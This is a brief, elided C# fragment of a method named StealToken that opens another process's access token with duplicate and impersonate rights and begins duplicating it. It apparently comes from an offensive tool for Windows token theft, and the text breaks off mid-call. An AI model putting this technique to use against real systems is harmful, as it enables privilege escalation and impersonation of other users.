        ...
        public static bool StealToken(int pid)
        {
            ...
            try
            {
                ...
                if (!Kernel32.OpenProcessToken(
                    hProcess,
                    DesiredAccess.TOKEN_ASSIGN_PRIMARY | DesiredAccess.TOKEN_DUPLICATE | DesiredAccess.TOKEN_IMPERSONATE | DesiredAccess.TOKEN_QUERY,
                    out IntPtr pToken))
                {
                    return false;
                }
                ...
                if (!Advapi.DuplicateTokenEx(pToken,
